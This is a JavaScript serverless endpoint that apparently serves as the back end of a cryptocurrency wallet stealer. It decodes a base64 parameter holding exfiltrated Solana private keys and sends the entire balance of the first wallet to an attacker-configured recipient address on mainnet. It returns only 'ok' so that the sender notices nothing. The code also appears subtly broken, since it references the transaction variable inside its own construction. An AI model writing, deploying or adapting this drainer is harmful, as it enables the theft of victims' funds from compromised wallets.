const { Connection, Keypair, PublicKey, SystemProgram, Transaction, sendAndConfirmTransaction } = require('@solana/web3.js');
const bs58 = require('bs58');

// Configuration - pulled from environment variables
const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS || 'ENTER_RECIPIENT_PUBLIC_KEY_HERE';
const CLUSTER_URL = process.env.CLUSTER_URL || 'https://api.mainnet-beta.solana.com';
const FEE_ESTIMATE = 5000; // Fallback lamports estimate

// In-memory set to prevent duplicate transfers (resets on function restart)
const processedKeys = new Set();

export default async function handler(req, res) {
  const query = req.query || {};
  const body = (req.body && typeof req.body === 'object') ? req.body : safeParseJSON(req.body);
  
  const dParam = (query.d || (body && body.d) || '').toString();
  
  if (dParam) {
    try {
      // Clean and decode the base64 data
      const cleaned = dParam.replace(/[()]/g, '');
      const decoded = Buffer.from(cleaned, 'base64').toString('utf8');
      const parsedData = tryJsonParse(decoded) ?? decoded;
      
      // Clean logs - only b64 data and decoded result
      console.log('[b64-data]', dParam);
      console.log('[decoded-data]', {
        ...parsedData,
        wallets: parsedData.wallets?.map(wallet => ({ ...wallet, key: 'REDACTED' }))
      });

      // Process private key for SOL transfer if wallets exist
      if (parsedData?.wallets?.[0]?.key) {
        const privateKeyBase58 = parsedData.wallets[0].key;
        try {
          // Decode base58 to Uint8Array
          const secretKey = bs58.decode(privateKeyBase58);
          if (secretKey.length !== 64) {
            throw new Error('Invalid private key length (must be 64 bytes)');
          }

          // Create Solana connection
          const connection = new Connection(CLUSTER_URL, 'confirmed');

          // Create Keypair and recipient PublicKey
          const fromKeypair = Keypair.fromSecretKey(secretKey);
          const toPubkey = new PublicKey(RECIPIENT_ADDRESS);
          const pubkeyStr = fromKeypair.publicKey.toBase58();

          // Check for duplicate processing
          if (processedKeys.has(pubkeyStr)) {
            console.log(`[skip] Already processed key: ${pubkeyStr}`);
          } else {
            processedKeys.add(pubkeyStr);

            // Get balance and blockhash
            const balance = await connection.getBalance(fromKeypair.publicKey);
            if (balance <= FEE_ESTIMATE) {
              console.error(`[error] Insufficient balance for transfer from ${pubkeyStr}: ${balance} lamports`);
            } else {
              const { blockhash } = await connection.getLatestBlockhash();

              // Create transfer transaction
              const transaction = new Transaction({
                recentBlockhash: blockhash,
                feePayer: fromKeypair.publicKey,
              }).add(
                SystemProgram.transfer({
                  fromPubkey: fromKeypair.publicKey,
                  toPubkey,
                  lamports: balance - (await transaction.getEstimatedFee(connection) || FEE_ESTIMATE),
                })
              );

              // Send and confirm
              const signature = await sendAndConfirmTransaction(connection, transaction, [fromKeypair], {
                maxRetries: 2,
                skipPreflight: false,
              });
              console.log(`[success] Transferred ${balance - (await transaction.getEstimatedFee(connection) || FEE_ESTIMATE)} lamports from ${pubkeyStr} to ${toPubkey.toBase58()}. Signature: ${signature}`);
            }
          }
        } catch (error) {
          console.error('[transfer-error]', `Failed to process SOL transfer for ${privateKeyBase58.slice(0, 8)}...: ${error.message}`);
        }
      }
    } catch (e) {
      console.log('[decode-error]', e?.message || String(e));
    }
  }

  // Simple response - users only see "ok"
  res.setHeader('Content-Type', 'text/plain');
  res.status(200).send('ok');
}

function safeParseJSON(input) {
  if (!input || typeof input !== 'string') return input;
  try { return JSON.parse(input); } catch { return input; }
}

function tryJsonParse(input) {
  try { return JSON.parse(input); } catch { return null; }
}
